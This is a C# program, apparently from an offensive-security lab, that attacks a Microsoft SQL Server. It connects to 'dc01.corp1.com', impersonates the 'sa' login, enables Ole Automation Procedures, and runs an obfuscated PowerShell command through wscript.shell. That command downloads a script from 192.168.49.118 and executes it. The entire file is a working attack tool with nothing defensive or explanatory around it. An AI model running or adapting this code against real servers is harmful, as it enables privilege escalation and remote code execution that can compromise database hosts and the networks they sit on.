using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;

namespace SqlConnectShare
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Auth success");
            }
            catch
            {
                Console.WriteLine("[!] Auth failed");
                Environment.Exit(0);

            }

            // Ole!
            String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEAMQA4AC8AcgB1AG4ALgBwAHMAMQAnACkAIAB8ACAASQBFAFgACgA=";
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;";
            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell',@myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '" + cmd + "';";
            
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_ole, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
